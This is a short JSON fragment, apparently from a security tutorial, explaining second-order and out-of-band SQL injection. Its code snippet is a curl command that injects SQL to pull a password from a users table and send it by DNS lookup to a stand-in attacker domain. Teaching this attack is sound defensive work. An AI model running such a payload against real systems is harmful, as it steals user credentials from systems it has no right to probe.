            "heading": "Second-Order & Out-of-Band SQL Injection",
            "text": "Second-Order SQLi occurs when injected payload is stored safely in the database, but later executed unsanitized during a secondary application workflow. Out-of-Band (OAST) triggers external DNS queries to exfiltrate data when direct responses are blocked.",
            "codeSnippet": "curl 'https://app.dopilot.org/vuln?id=1;SELECT+load_file(concat(\"\\\\\\\\\",(SELECT+password+FROM+users+LIMIT+1),\".c2.attacker.com\\\\test\"))'",
